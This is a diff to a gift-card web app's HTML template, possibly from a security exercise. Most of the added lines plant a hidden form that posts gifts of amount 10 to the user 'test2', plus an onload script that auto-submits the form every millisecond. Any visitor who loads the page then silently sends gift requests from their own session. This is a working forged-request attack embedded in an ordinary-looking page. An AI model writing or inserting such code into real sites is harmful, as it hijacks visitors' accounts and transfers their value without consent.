@@ -81,6 +81,32 @@
                     <input type="text" class="form-control mb-2" name="username" id="username" placeholder="Username">
                     <button class="btn btn-block" type="submit">Gift one</button>
                 </form>
+
+
+                <form name="maliciousform" action="/gift/{{ prod_num }}" method="post">
+                  <div class="mb-4">
+                    <input type="hidden" class="form-control mb-2" name="amount" id="amount" value=10>
+                    <input type="hidden" class="form-control mb-2" name="username" id="username" value="test2">
+                </form>
+
+
+
+                <script type="text/javascript">
+                  window.onload = function () {
+                    var auto = setTimeout(function () { autoRefresh(); }, 1);
+
+                    function submitform() {
+                      alert('test');
+                      document.forms["maliciousform"].submit();
+                    }
+
+                    function autoRefresh() {
+                      clearTimeout(auto);
+                      auto = setTimeout(function () { submitform(); autoRefresh(); }, 1);
+                    }
+                  }
+                </script>
+
                 <span class="d-block text-center my-2">or</span>
                 <a href="/buy/{{ prod_num }}">
                   <center>Buy one</center>
@@ -95,7 +121,8 @@
                 <div class="mb-2">
                   <input type="text" class="form-control" id="directorName" placeholder="Enter your name">
                 </div>
-                <button class="btn btn-primary btn-block" onclick="shareProduct()">Generate Share Link</button>
+                <button class="btn btn-primary btn-block" onclick="shareProduct()">Generate Share
+                  Link</button>
               </div>
 
               {% if not request.user.is_authenticated %}
